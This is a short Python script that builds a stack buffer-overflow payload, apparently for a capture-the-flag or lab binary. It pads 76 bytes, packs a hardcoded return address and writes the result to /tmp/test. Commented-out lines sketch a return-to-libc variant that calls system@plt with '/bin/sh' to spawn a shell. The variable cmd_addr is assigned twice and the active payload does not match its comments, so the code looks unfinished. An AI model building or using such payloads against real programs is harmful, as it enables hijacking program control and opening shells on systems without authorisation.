import struct
# Addresses
system_addr = 0x8048360  # Address of system@plt
cmd_addr = 0xbffff738   # Address where the command will be in the buffer
cmd_addr = 0x08048464

# Construct payload
payload = b"A" * 76       # Fill buffer
# payload += struct.pack("<I", system_addr)  # Address of system@plt
# payload += struct.pack("<I", 0x0)         # Dummy return address for system (can be 0)
payload += struct.pack("<I", cmd_addr)    # Argument to system (address of the command)

# Append the command
# payload += b"/bin/sh"
# print(payload)

# pyperclip.copy(payload)

f = open("/tmp/test", "wb")
f.write(payload)
f.close()